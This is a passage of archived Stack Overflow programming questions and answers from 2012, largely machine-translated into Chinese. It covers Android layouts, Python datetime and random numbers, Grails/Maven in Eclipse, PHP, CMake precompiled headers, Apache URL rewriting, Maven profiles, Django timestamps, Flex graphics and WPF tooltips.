> 时间：2012-08-22T08:02:35.233
> 
> 标签：android, android-layout

我有一个`RelativeLayout`里面有很多控件。在某些屏幕上，此布局以及其他屏幕元素可能没有足够的空间。在这种情况下，我想使用一种替代布局，它排除了一些控件并且填充较少。

如何以高性能的方式实现这一点？只有当较大的布局绝对不适合时，才应该加载较小的布局。我不想使用各种[屏幕尺寸限定符](http://developer.android.com/guide/practices/screens_support.html#NewQualifiers)，因为布局是否适合是屏幕宽度和高度以及其他可见控件的函数，这似乎会变得太复杂。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:31:57.830

**我个人认为您应该使用新的屏幕尺寸限定符**。这就是 Android 的设计方式，我认为您应该遵循这些规则。它很可能还会使整个开发过程变得更加容易！

* * *

但是如果你坚持自己做，我能想到的“硬编码”它的唯一方法是这样的：

**第一步：获取屏幕尺寸**

```
Display display = getWindowManager().getDefaultDisplay();
Point size = new Point();
display.getSize(size);
int width = size.x;
int height = size.y; 
```

或者如果您的目标是较低的 API 级别：

```
Display display = getWindowManager().getDefaultDisplay(); 
int width = display.getWidth();  // deprecated
int height = display.getHeight();  // deprecated 
```

**第 2 步：根据屏幕尺寸选择替代布局**

```
if(width < value_x_small && height < value_y_small){
        setContentView(R.layout.main_small);

} else if(width > value_x_small && height > value_y_small){
        setContentView(R.layout.main_large);

} else {
        setContentView(R.layout.main_larged);

} 
```

此代码允许您根据屏幕大小（以 px 为单位）选择自己的资源。将 px 值转换为 DP (DPI) 并使用它们来做出决定可能会更好。您可能还想添加对当前屏幕方向的检查。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:17:21.753

您可以单独实现控件`Fragments`并根据屏幕大小定位它们。这是有关[Fragments 及其设计理念](http://developer.android.com/guide/components/fragments.html)的更多信息。

# python - importing required module

> ID：12068736
> 
> 赞同：0
> 
> 时间：2012-08-22T08:02:36.037
> 
> 标签：python

The following code is working as expected. But I have 2 questions.

```
# import datetime # does not work
from datetime import datetime
row = ('2002-01-02 00:00:00.3453', 'a')
x = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S.%f") 
```

1) Why does only import datetime does not work?

2) How do I know to which module does the 'strptime' method belogs to?

```
>>> help('modules strptime') 
```

does not provide the info I am looking for.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:07:01.697

```
 datetime 
```

Is a module. It also has a member named **datetime** which has a method named **strptime**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T08:07:34.473

1) It works fine. But the `datetime` class within is separate. You need to refer to it as `datetime.datetime`.

2) Use the [General Index](http://docs.python.org/genindex.html). But methods belong to objects, not modules.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-22T08:12:16.373

The method is `datetime.datetime.strptime`, and when you do a simple `import datetime`, you are only importing the top level module, not the `datetime` *class*

You can test this out like this:

```
>>> import datetime
>>> locals()
{'__builtins__': <module '__builtin__' (built-in)>, '__name__': '__main__', 'dat
etime': <module 'datetime' (built-in)>, '__doc__': None, '__package__': None}

>>> from datetime import datetime
>>> locals()
{'__builtins__': <module '__builtin__' (built-in)>, '__name__': '__main__', 'dat
etime': <type 'datetime.datetime'>, '__doc__': None, '__package__': None} 
```

You can see that there are two different objects in your namespace.

For your second question Python's built-in `help()` only works for those modules and objects that are loaded. If you didn't `import datetime`, `help()` can't help you. So its best to browse the documentation for this; and a google on `python strptime` generally lands you at the correct documentation page.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-22T08:13:54.080

Either you do:

```
import datetime
x = datetime.datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S.%f") 
```

or you do:

```
from datetime import datetime
x = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S.%f") 
```

# java - 如何使用 Eclipse、Maven、Grails 和 git 建立一个新的 Java 项目？

> ID：12068740
> 
> 赞同：1
> 
> 时间：2012-08-22T08:02:45.097
> 
> 标签：java, eclipse, git, grails, maven

我是 Grails 开发的新手，想建立一个新项目，所以我可以使用 Eclipse 作为 IDE，并使用 Maven 在我的 CI (Jenkins) 上构建它。这是我的环境：

*   Java 1.6.0
*   圣杯 2.1.0
*   Maven 2.2.1
*   带有 m2e 和 egit 插件的 Eclipse Juno

[我使用了来自http://grails.org/doc/latest/guide/commandLine.html#antAndMaven](http://grails.org/doc/latest/guide/commandLine.html#antAndMaven)的以下命令 ：

```
mvn archetype:generate -DarchetypeGroupId=org.grails \
-DarchetypeArtifactId=grails-maven-archetype -DarchetypeVersion=2.1.0 \
-DgroupId=com.company.dep -DartifactId=project
mvn initialize 
```

但是在 Eclipse 中将其作为 maven 项目导入后，出现了关于 slf4j 和 com.sun.tools 未找到以及生命周期阶段未映射的错误。

在 Eclipse 中运行它需要哪些步骤？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T08:08:21.623

Plugins, Plugins, Plugins...你可以为eclipse添加maven插件/Grails插件，然后构建一个新项目。

选择创建 maven 项目的选项（它会自动为您生成 pom 文件）然后您可以将 Grails 添加到其中...

同样，您可以启动一个新的 grails 项目，然后将 maven 添加到其中。它将自动下载所有依赖项。

大多数插件都可以从以下网址免费下载：[http ://marketplace.eclipse.org](http://marketplace.eclipse.org)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T09:22:25.590

当 Eclipse 使用 JRE 而不是 JDK 时，通常会导致 com.sun.tools 错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T09:22:46.240

Grails 有自己的创建项目的机制，使用它。从 Grails 2.1 开始，您可以在之后生成 Maven 内容。

您可以按照以下过程：

1.  获取STS - Springsrouce Tool Suite（实际3.0），基于Eclipse
2.  将 Grails 插件安装到 STS 中。
3.  获取 Grails FW，解压缩并在 STS 中配置它的路径。
4.  通过 Grails 命令创建新项目：grails create-app
5.  将其导入 Git。

关于maven集成，有一篇不错的文章：

[http://www.znetdevelopment.com/blogs/2012/07/11/grails-2-1-and-maven-integration-simple-project/](http://www.znetdevelopment.com/blogs/2012/07/11/grails-2-1-and-maven-integration-simple-project/)

# facebook - 我怎么知道我的应用程序是否粉碎了 Facebook 政策

> ID：12068743
> 
> 赞同：0
> 
> 时间：2012-08-22T08:02:57.370
> 
> 标签：facebook, facebook-graph-api, policy

我怎么知道我的应用程序是否粉碎了 Facebook 政策？我为 facebook api 帖子创建了一个自定义的 facebook 帖子预览。它会被 facebook 政策粉碎吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:09:27.557

这是你要找的吗？

[https://developers.facebook.com/policy/](https://developers.facebook.com/policy/)

# php - php调用函数动态返回null

> ID：12068748
> 
> 赞同：1
> 
> 时间：2012-08-22T08:03:16.207
> 
> 标签：php, reflection

我尝试使用 call_user_func_array 动态调用函数，但我面临的问题是，如果函数返回布尔值，参数变量存储在数组中，但如果函数返回字符串，它将正常工作

> call_user_func_array() 期望参数 1 是一个有效的回调，函数 'equal' 未找到或无效的函数名不包含在 ...

```
$param = array (
   0 => Jill
   1 => Jack
);

echo call_user_func_array("equal", $param);

function equal($str, $str_2) {
     if ($str==$str_2) {
         return true;
     } else {
         return false;
     }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:20:16.330

我试过你的脚本。它正在工作并返回“false”。只需使用 var_dump() 而不是 echo 来测试它。如果 equal() 返回数组，则也返回数组。对我来说没有错误。

# python - 选择多个带有输入的随机整数

> ID：12068749
> 
> 赞同：0
> 
> 时间：2012-08-22T08:03:18.247
> 
> 标签：python

我一直在努力解决这个问题。我想输入一个 1 到 5 之间的数字。例如，如果我选择输入数字 3，我想从 1 到 10 之间的数字类别中随机选择 3 个数字。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:44:06.110

一个简单的方法：

```
from random import choice
list_of_numbers = range(11)[1:] # the 1: drops the zero
choice(list_of_numbers) # picks a random number from the list 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:08:03.303

```
import random
random.seed()
a = 1
b = 10
randList = []
for x in range(3):
    # random integer N such that a <= N <= b
    randList.append(random.randint(a, b)) 
```

或者更好：

```
import random
random.seed()
a = 1
b = 10
randList = [random.randint(a,b) for x in range(3)] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:14:06.123

```
myrands = [rand_int(1,10) for x in range(0,int(raw_input()))] 
```

`myrands`是 1 到 10 之间的随机数列表，长度由用户输入确定。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-22T08:09:50.370

这种东西可以工作......

```
In [84]: user_input = raw_input("Enter a number between 1 to 5 :")
Enter a number between 1 to 5 :3

In [85]: selected_elem = []

In [86]: while len(selected_elem) < int(user_input):
   ....:         random_elem = random.randrange(1, 10, 1)
   ....:         if random_elem not in selected_elem:
   ....:                 selected_elem.append(random_elem)
   ....:

In [87]: print selected_elem
[1, 2, 4] 
```

# cmake - CMake 中的条件 add_custom_command

> ID：12068755
> 
> 赞同：0
> 
> 时间：2012-08-22T08:03:36.543
> 
> 标签：cmake, cmake-custom-command

我正在使用宏为我的 cmake 项目创建预编译头文件。对于 gcc，此宏使用 add_custom_command 创建一个 *.h.gch 文件，然后可以将其与其他源文件一起添加到目标文件 add_executable/add_library。问题是有时同一个 *.h.gch 文件用于两个不同的目标，因为有些库是作为静态库和动态库构建的。

我需要在每个 add_library 调用之后调用宏，因为对于 MSVC/Xcode，需要调整目标属性以启用 PCH 使用/编译。但是对于 gcc，这会导致错误，因为我试图将 add_custom_command 与已经具有构建规则（.gch）的输出一起使用。目前，我通过跳过名称中包含“静态”的任何目标的 add_custom_command 来避免此错误 - 这恰好可以工作，因为项目中的所有静态库都有一个“静态”后缀，但它显然不是一个非常优雅的解决方案.

**cmake 中有没有办法检查目标是否已经有构建规则，或者有一种方法可以让 add_custom_command 静默失败而不会导致错误？**或者有没有办法改变我的设计，这样我就可以完全避免这个问题？我想一个“解决方案”是在每个 CMakeLists 中添加一个条件检查，但我真的不想这样做。

这是我目前使用的代码：

宏：

```
macro(SET_PRECOMPILED_HEADER targetName PCHFile)
if(MSVC)
# PCH for MSVC
elseif(${CMAKE_GENERATOR} MATCHES "Xcode")
# PCH for Xcode
else() #gcc
if(NOT ${targetName} MATCHES "Static") ## <-- this is bad
    ## set the correct "compilerArgs"
    add_custom_command(
        OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/${PCHFile}.gch
        COMMAND ${CMAKE_CXX_COMPILER} ${CMAKE_CXX_COMPILER_ARG1} ${compilerArgs}
        DEPENDS ${CMAKE_CURRENT_SOURCE_DIR}/${PCHFile}
    )
endif()
endmacro(SET_PRECOMPILED_HEADER targetName PCHFile) 
```

...然后在 CMakeLists 中，如下所示：

```
# Dynamic version:
set(MODULE_NAME MyLib)
project(${MODULE_NAME})

## set ${sources}

add_library(${MODULE_NAME} SHARED ${sources} "src/precompiled.h.${PCH_EXT}")

set_target_properties(${MODULE_NAME} PROPERTIES COMPILE_DEFINITIONS MY_DLL_DEFINITION)

SET_PRECOMPILED_HEADER(${MODULE_NAME} "src/precompiled.h")

# Static version:
set(MODULE_NAME MyLibStatic)
project(${MODULE_NAME})

add_library(${MODULE_NAME} ${sources} "src/precompiled.h.${PCH_EXT}")

set_target_properties(${MODULE_NAME} PROPERTIES COMPILE_DEFINITIONS MY_STATIC_DEFINITION)

SET_PRECOMPILED_HEADER(${MODULE_NAME} "src/precompiled.h") 
```

谢谢你的帮助！如果这是重复的，我很抱歉 - 关于 add_custom_command 已经有几个问题，但它们似乎都没有解决我所追求的问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T16:24:42.173

首先，您可以为每个 PCH 创建目标，然后在声明新目标之前使用它：

```
if(TARGET ${PCHFile}.gch) 
```

* * *

其他方式：

在根 CMakeLists.txt 中：

`set(PRECOMPILED_HEADERS "" CACHE INTERNAL "")`

在宏中：

```
list(FIND PRECOMPILED_HEADERS ${CMAKE_CURRENT_BINARY_DIR}/${PCHFile}.gch res)
if(NOT res EQUAL -1)
  add_custom_command(
          OUTPUT ${CMAKE_CURRENT_BINARY_DIR}/${PCHFile}.gch
          COMMAND ${CMAKE_CXX_COMPILER} ${CMAKE_CXX_COMPILER_ARG1} ${compilerArgs}
          DEPENDS ${CMAKE_CURRENT_SOURCE_DIR}/${PCHFile}
      )
  list(APPEND PRECOMPILED_HEADERS ${CMAKE_CURRENT_BINARY_DIR}/${PCHFile}.gch)
endif() 
```

# url - 使用 vhost 和 url 重写时请求的 URL 将如何显示？

> ID：12068756
> 
> 赞同：0
> 
> 时间：2012-08-22T08:03:39.277
> 
> 标签：url, mod-rewrite, url-rewriting, request, vhosts

我有一个小系统 ( `Coldfusion8, MySQL 5.0.88`)，它允许用户根据他们的偏好设置主网站的外观。

这一切都很好，除了 URL 仍然像这样丑陋：

```
 www.my_site.com/index.cfm?user=123456789 
```

我现在希望用户显示他们自己的 URL 并阅读`vhost`（我正在运行`Apache`）如何执行此操作。我正在根据 URL 中提供的 id 更改皮肤。如果我现在将我的系统设置为显示：

```
 wwww.users_selected_url.com 
```

与上述相比，我将无法检查 URL ID。在使用 Coldfusion 渲染页面时，我在整个应用程序中使用此 ID 检查来自定义页面布局。

**问题：**
什么时候会重新格式化 URL？是否仍会使用原始 URL 请求正在加载的页面，因此 Coldfusion 可以做到这一点，并且只有向用户显示的页面将使用他的自定义 URL？如果我也使用 URL 重写呢？

感谢您提供一些信息！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:28:44.527

您需要有一个 vhost 设置来接受对`wwww.users_selected_url.com`主机的请求，并且 DNS 需要指向您的服务器。在 vhost 配置中，您可以使用 rewrite 模块将 URL 更改为`/index.cfm?user=123456789`，并且此重写发生在 URI 移交给冷融合之前。您需要将其添加到您的虚拟主机配置中：

```
RewriteEngine On
RewriteCond %{HTTP_HOST} ^(www\.)?users_selected_url.com$ [NC]
RewriteRule ^/$ http://www.my_site.com/index.cfm?user=123456789 [L,P] 
```

这使用 mod_proxy 将请求代理到`http://www.my_site.com/index.cfm?user=123456789`当有人进入`http://www.users_selected_url.com/`他们的浏览器时。

# maven - 在 Maven 配置文件中使用属性标签

> ID：12068758
> 
> 赞同：16
> 
> 时间：2012-08-22T08:03:44.863
> 
> 标签：maven, properties, maven-profiles

我指的是“ **Maven：完整参考**”，尤其是有关配置文件的部分，该部分记录了此处`<properties...`标签中`<profile...`标签的使用：[请参阅此处](http://www.sonatype.com/books/mvnref-book/reference/profiles-sect-tips-tricks.html#profiles-sect-common-envs)

```
 <profile>
            <id>development</id>
            <activation>
                <activeByDefault>true</activeByDefault>
                <property>
                    <name>environment.type</name>
                    <value>dev</value>
                </property>
            </activation>
            <properties>
                <database.driverClassName>com.mysql.jdbc.Driver</database.driverClassName>
                <database.url>
                    jdbc:mysql://localhost:3306/app_dev
                </database.url>
                <database.user>development_user</database.user>
                <database.password>development_password</database.password>
            </properties>
        </profile> 
```

我不确定的`mvn install -Denvironment.type=dev`是运行命令时会发生什么：

*   这会创建一个`.properties`文件吗？
*   如果不是，当应用程序在开发中测试时，tomcat（例如）将如何以及在哪里读取各个属性？

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-08-22T08:37:10.277

> 这会创建一个 .properties 文件吗？

不，不会的。这将设置 maven 使用的属性。也就是说，`mvn install -Denvironment.type=development`maven 将使用值 'development_user' 作为变量 'database.user' （您可以在 poms 和过滤资源中用作 ${database.user} ）。

> 如果不是，当应用程序在开发中测试时，tomcat（例如）将如何以及在哪里读取各个属性？

事情是告诉 maven 根据配置文件（properties.files）过滤（和修改）您想要自定义的资源。

所以，首先你要说 maven 来过滤资源：

```
<build>
    <resources>
        <resource>
             <directory>src/main/resources</directory>
             <filtering>true</filtering>
        </resource>
    </resources> 
</build> 
```

然后修改您的属性文件以使用 Maven 变量。例如，您的 db 属性文件如下所示：

```
database.driverClassName=${database.driverClassName}
database.url=${database.url}
#... 
```

# php - json_encode 数组的问题

> ID：12068759
> 
> 赞同：1
> 
> 时间：2012-08-22T08:03:47.680
> 
> 标签：php, javascript, jquery

我的 JSON_encode 和 jQuery 有问题，我让它用以下代码发布完整的数组，但我不能让它只回显我需要的一个数组。

```
$.get("/indexget.php", { page: "goals" },function(data) {
$('#bodyContentStuff').text(data); 
```

完整的 jQuery 代码

```
$("#navLinkGoals").click(function () {
    $("#bodyTitleBar").text("Goals");
    $.get("/indexget.php", { page: "goals" },function(data) {
        $('#bodyContentStuff').text(data);
    }
); 
```

完整的 PHP 代码

```
if($_REQUEST['page'] = 'goals'){
    $result = mysql_query("SELECT * FROM content WHERE page='indexGoals'") 
    or die(mysql_error()); 
    $row = mysql_fetch_array( $result );
    $message = $row['message'];
}
echo json_encode(array("content"=>"$message")); 
```

我是一个编程的菜鸟，但如果你想看看它在做什么，该站点是[http://www.gronge.com ，只需单击目标链接。](http://www.gronge.com)

编辑：哦，我也试过了

```
$('#bodyContentStuff').text(data['content']); 
```

但它没有用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:07:58.027

如果那是逐字粘贴，则调用 $.get 时缺少右括号

```
$("#navLinkGoals").click(function () {
    $("#bodyTitleBar").text("Goals");
    $.get(
        "/indexget.php",
        {
            page: "goals"
        },
        function(data) {
            $('#bodyContentStuff').text(data);
        }
    ); // <== Right here
); 
```

（代码重新格式化以突出差异）

刚刚注意到 PHP 的一个潜在问题：

```
if($_REQUEST['page'] = 'goals'){ //<== are you assigning or comparing?
    $result = mysql_query("SELECT * FROM content WHERE page='indexGoals'") 
    or die(mysql_error()); 
    $row = mysql_fetch_array( $result );
    $message = $row['message'];
}
echo json_encode(array("content"=>"$message")); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:07:36.887

您是否尝试过像这样放置“，'json'”：

```
$.get("/indexget.php", { page: "goals" },function(data) {
    $('#bodyContentStuff').text(data.content);
}, 'json') 
```

没有那个 jquery 会智能地猜测格式是什么......

如前所述，它应该是 data.content

如前所述，使用 console.log(data) 来查看真正的数据（可能是一个字符串，而它应该是一个 json 对象？）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:11:37.077

您是否记录了`data`变量？它记录什么？另外：`mysql_*`已弃用，避开并开始使用 PDO。但我认为你的意思是分配`$row[0]['message']`给`$message`变量。如果记忆对我有用，`mysql_*`总是返回一个 assoc 数组或一个数组数组。

当我们谈到这个主题时：JavaScript 没有关联数组，只有对象，所以与其访问数据，不如`data['content']`使用`data.content`. 括号符号是为了方便起见，因此您可以使用变量的值作为属性名称（不带 eval），当然是*EVIL*。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T08:06:07.933

而不是使用 $.post

```
 $("#navLinkGoals").click(function () {
   $("#bodyTitleBar").text("Goals");
    $.post("/indexget.php", { page: "goals" },function(data) {
    $('#bodyContentStuff').text(data);
}
); 
```

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-08-22T08:07:14.143

也在你的 php 上：

```
$row = mysql_fetch_assoc($result); 
```

而不是 mysql_fetch_array，如果你想使用`$row['message']`符号。

# flex4 - 当鼠标从画布上滚出时清除图形

> ID：12068765
> 
> 赞同：1
> 
> 时间：2012-08-22T08:04:16.373
> 
> 标签：flex4

我创建了一个平铺列表，平铺列表的每个平铺都是一个画布，在该画布上绘制图形。当鼠标从该特定画布上滚出时，必须删除绘制的图形。所以我正在做**graphics.clear**但无法删除图形。

代码

```
protected function canvas1_updateCompleteHandler(event:FlexEvent):void
            {           
                var allowHighLight:Boolean = QzGridImpl(this.owner).m_bEnableHighLight;
                if(!allowHighLight)
                    return;
                var highLighted:Boolean = TileList(this.owner).isItemHighlighted(this.data);
                if(highLighted)
                {
                    high = true;
                    DrawBackgroundImage(QzGridImpl(this.owner).m_strBackgroundImage as String);

                }
//when highlighted becomes false the below part is called
                else
                {

                    if(high)
                    {

                        this.graphics.endFill();//and cleanly im observing that endfill and clear is getting called and they are able to clear graphics when mouse is rolled out slowly but not able to clear when mouse is rolled out fast.

                        trace("endfill");
                        this.graphics.clear();
                        trace("clear");

                    }
                }

private function DrawBackgroundImage(n_strBackImg:String):void
{

//code for drawing the background image
} 
```

并且干净地我观察到 endfill 和 clear 被调用，当鼠标缓慢推出时它们能够清除图形，但当鼠标快速推出时无法清除。

需要做什么才能使其正常工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-05T17:20:41.023

您可以为 TileList 创建自定义 ItemRenderer，并在 itemRenderer 中触发翻转时应用图像效果（通过向渲染器添加翻转侦听器）。这可能会奏效 - 并且可能也是一种更简洁的方式。

# python - 在 django api 调用中检索 UNIX TIMESTAMP

> ID：12068766
> 
> 赞同：0
> 
> 时间：2012-08-22T08:04:23.523
> 
> 标签：python, mysql, django

我有以下查询：

```
users = Analytics.objects.values('date', 'users').order_by('date')
[(datetime.date(2012, 8, 20), 156L), (datetime.date(2012, 8, 21), 153L),...] 
```

我如何在这里获取日期时间的 unix 时间戳？相当于做：

```
select concat(UNIX_TIMESTAMP(date), '000') as date, users from analytics_analytics
1345446000000   156
1345532400000   153
1345618800000   153 
```

请注意，我不想在 python 中进行格式化，因为需要完成很多上述调用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:10:05.377

Python`datetime.date`对象没有时间组件，因此您想要的时间戳需要一点限定。如果午夜足够，您可以使用该[`.timetuple()`方法](http://docs.python.org/library/datetime.html#datetime.date.timetuple)与该[`time.mktime()`函数](http://docs.python.org/library/time.html#time.mktime)一起创建时间戳：

```
>>> import datetime, time
>>> adate = datetime.date(2012, 8, 20)
>>> print time.mktime(adate.timetuple())
1345413600.0 
```

如果您需要一天中的特定时间，请使用[`datetime.datetime.combine()`类方法](http://docs.python.org/library/datetime.html#datetime.datetime.combine)构造 a `datetime`，然后使用相同的技巧使其成为时间戳：

```
>>> adatetime = datetime.datetime.combine(adate, datetime.time(12, 0))
>>> print time.mktime(adatetime.timetuple())
1345456800.0 
```

在你的 Django 模型上使用任何一个属性：

```
class Analytics(models.Model):
    @property
    def timestamp(self):
        return time.mktime(self.date.timetuple()) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:15:43.423

最好的方法是，如果真的希望数据库进行转换（这可能适用于其他事情，通常当您想要返回数据库中的列中不容易获得的信息时），您可以使用QuerySet.extra() 函数[https://docs.djangoproject.com/en/dev/ref/models/querysets/#extra](https://docs.djangoproject.com/en/dev/ref/models/querysets/#extra)像这样：

```
Analytics.objects.extra(select={'timestamp': "CONCAT(UNIX_TIMESTAMP(date), '000')"}).order_by('date').values('timestamp', 'users') 
```

这样做的缺点是它不再与 DB 无关，因此当您更改 RDBMS 时，您必须更改代码。好处是您可以使用值，这与模型上的属性不同。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:10:58.277

我不熟悉 UNIX_TIMESTAMP，但关于 Django：Why not create a computed field as proprty at your Django Model

```
class Analytics(...):
    ...
    @property
    def unix_timestamp(self):
        return time.mktime(self.date.timetuple()) 
```

# wpf - WPF 中的 Windows 资源管理器工具提示

> ID：12068768
> 
> 赞同：0
> 
> 时间：2012-08-22T08:04:29.863
> 
> 标签：wpf, windows, binding, tooltip, explorer

这不是我想要的那么难，但我几天都在拉我的头发！

我只想要与 WINdows Explorer 相同的工具提示行为：使用显示完整元素的工具提示覆盖部分隐藏的树/列表元素

我在树视图中使用以下数据模板

```
<HierarchicalDataTemplate DataType="{x:Type TreeVM:SurveyorTreeViewItemViewModel}" ItemsSource="{Binding Children, Converter={StaticResource surveyorSortableCollectionViewConverter}}">
    <StackPanel x:Name="SurveyorStackPanel" Margin="0" HorizontalAlignment="Stretch" VerticalAlignment="Stretch" Orientation="Horizontal" Height="20" Width="auto">
      ... (Textblocks, properties, usercontrol, border,... )                   
      <StackPanel.ToolTip>
          <ToolTip Placement="RelativePoint" Padding="0" HasDropShadow="False" 
               DataContext="{Binding ElementName=SurveyorStackPanel}">
                <Rectangle HorizontalAlignment="Left" VerticalAlignment="Center"
                           Width="{Binding ElementName=SurveyorStackPanel, Path=Width}"
                           Height="{Binding ElementName=SurveyorStackPanel, Path=Height}">
                     <Rectangle.Fill>
                        <VisualBrush AutoLayoutContent="True" AlignmentX="Left" 
                                     Visual="{Binding}" Stretch="None"/>
                     </Rectangle.Fill>
                </Rectangle>
           </ToolTip>
       </StackPanel.ToolTip>                                  
   </StackPanel>
</HierarchicalDataTemplate> 
```

如您所见，我正在尝试使用 Visualbrush。但这不起作用。它只显示您在屏幕上看到的内容。

我已经尝试使用静态资源并绑定在工具提示中的新堆栈面板上，但这只会留下一个 blanc 工具提示。

我有什么问题吗？我必须使用替代品吗？我在 WPF 中很新。我知道基础知识，但绑定/资源对我来说有点新

编辑这里是我试过的静态源：

```
<ToolTip x:Key="reflectingTooltip" DataContext="{Binding Path=PlacementTarget, RelativeSource={x:Static RelativeSource.Self}}" Placement="RelativePoint" Padding="0" HasDropShadow="False">
   <Rectangle Width="{Binding ActualWidth}" Height="{Binding Path=ActualHeight}" Margin="0"
              HorizontalAlignment="Stretch" VerticalAlignment="Stretch">
      <Rectangle.Fill>
           <VisualBrush Visual="{Binding}" Stretch="None" AlignmentX="Left" />
      </Rectangle.Fill>
   </Rectangle>
</ToolTip> 
```

编辑 2

以下是我现在的情况的几张图片：当工具提示显示时，必须显示整个元素。在工具提示之前：[http ://desmond.imageshack.us/Himg832/scaled.php?server=832&filename=beforedo.png&res=landing](http://desmond.imageshack.us/Himg832/scaled.php?server=832&filename=beforedo.png&res=landing)

当显示工具提示时：[http ://desmond.imageshack.us/Himg842/scaled.php?server=842&filename=afterbl.png&res=landing](http://desmond.imageshack.us/Himg842/scaled.php?server=842&filename=afterbl.png&res=landing)

工具提示的高度太大，只显示屏幕显示的内容。唯一的问题是“填写”隐藏的文本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:08:07.263

VisualBrush 以位图的形式呈现与您通过“Visual”属性提供的完全相同的内容，并且它无需对该内容进行任何修改即可：它完全按照现在的方式呈现它们。

如果您想显示其他内容，则必须提供其他内容。您可以尝试使用类似的内容吗：？

```
<Window x:Class="UncutTooltip.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="MainWindow" Height="350" Width="525">
    <StackPanel Orientation="Horizontal">
        <ListBox ItemsSource="{Binding}">
            <ListBox.ItemContainerStyle>
                <Style TargetType="ListBoxItem">
                    <Setter Property="HorizontalAlignment" Value="Stretch" />
                    <Setter Property="Width" Value="250" />
                </Style>
            </ListBox.ItemContainerStyle>
            <ListBox.ItemTemplate>
                <DataTemplate>
                    <Grid Background="Transparent">
                        <TextBlock Text="{Binding TheText}"
                            TextTrimming="CharacterEllipsis">
                        </TextBlock>

                        <Grid.ToolTip>
                            <TextBlock Text="{Binding TheText}"
                            TextTrimming="CharacterEllipsis">
                            </TextBlock>
                        </Grid.ToolTip>
                    </Grid>
                </DataTemplate>
            </ListBox.ItemTemplate>
        </ListBox>

        <Border Background="Red" >
            <TextBlock Margin="5" Foreground="WhiteSmoke" FontSize="18"
                       Text="The end of window:)" TextAlignment="Center">
                <TextBlock.LayoutTransform>
                    <RotateTransform Angle="-90" />
                </TextBlock.LayoutTransform>
            </TextBlock>
        </Border>
    </StackPanel>
</Window>

---

using System.Collections.Generic;
using System.Windows;
namespace UncutTooltip
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            this.DataContext = new List<Item>
            {
                new Item { TheText = "its not that hard what i want, but i'm pulling my hairs for days!" },
                new Item { TheText = "i just want the same tooltip behaviour like the WIndows Explorer: overlay a partially hidden tree/list element with the tooltip that displays the full element" },
                new Item { TheText = "i use the following datatemplate in my treeview" },
                new Item { TheText = "As you can see, i'm trying to use Visualbrush. but this doesnt work. it only shows what you see on the screen." },
                new Item { TheText = "I have tried with static resource and binding on a new stackpanel thats in the tooltip, but that only leaves with a blanc tooltip." },
                new Item { TheText = "Do i something wrong? do i have to use alternatives? i'm pretty new in WPF. i know the basics, but binding/resources is kinda new for me" },
            };
        }
    }

    public class Item
    {
        public string TheText { get; set; }
    }
} 
```

编辑：

现在，将工具提示内容更改为 ie：

```
 <Grid.ToolTip>
                        <ListBox ItemsSource="{Binding TheWholeList}">
                            <ListBox.ItemContainerStyle>
                                <Style TargetType="ListBoxItem">
                                    <Setter Property="HorizontalAlignment" Value="Stretch" />
                                    <!--<Setter Property="Width" Value="250" />-->
                                </Style>
                            </ListBox.ItemContainerStyle>
                            <ListBox.ItemTemplate>
                                <DataTemplate>
                                    <Grid Background="Transparent">
                                        <TextBlock Text="{Binding TheText}" />
                                    </Grid>
                                </DataTemplate>
                            </ListBox.ItemTemplate>
                        </ListBox>
                    </Grid.ToolTip> 
```

并将数据定义更改为：

```
public class Item
{
    public string TheText { get; set; }
    public IList<Item> TheWholeList { get; set; }
}

        var tmp = new List<Item>
        {
             .........
        };

        foreach (var it in tmp)
            it.TheWholeList = tmp;

        this.DataContext = tmp; 
```

请注意，我已经注释掉了工具提示列表框中的宽度约束，它将显示一个未截断元素的未截断列表。

编辑#2：

```
<StackPanel Orientation="Horizontal">
    <ListBox x:Name="listbox" ItemsSource="{DynamicResource blah}">   // <---- HERE
        <ListBox.ItemContainerStyle>
            <Style TargetType="ListBoxItem">
                <Setter Property="HorizontalAlignment" Value="Stretch" />
                <Setter Property="Width" Value="250" />
            </Style>
        </ListBox.ItemContainerStyle>
        <ListBox.ItemTemplate>
            <DataTemplate>
                <Grid Background="Transparent">
